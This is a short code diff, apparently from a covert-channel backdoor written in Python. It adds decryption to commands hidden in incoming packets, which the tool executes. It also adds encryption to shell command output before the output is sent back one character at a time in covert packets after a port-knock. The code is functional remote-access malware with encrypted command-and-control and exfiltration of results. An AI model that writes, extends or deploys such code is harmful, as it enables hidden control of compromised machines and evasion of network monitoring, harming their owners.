@@ -61,6 +61,7 @@ def checkCommand(ip, proto, data, pacType):
 		if character != 15:
 			command += chr(character)
 		else:
+			command = utils.decryptData(command)
 			executeCommand(socket.inet_ntoa(ip[8]), pacType, command)
 			command = ""
 
@@ -81,7 +82,7 @@ def sendResults(address, protocol, comm):
 	knockCode(address, protocol, True)
 	results = subprocess.Popen(comm, shell=True, stdout=PIPE).stdout.read()
 
-	# encrypt results 
+	results = utils.encryptData(results)
 	for c in results:
 		send(utils.covertPacket(address, protocol, c, pswd), verbose=0)
 
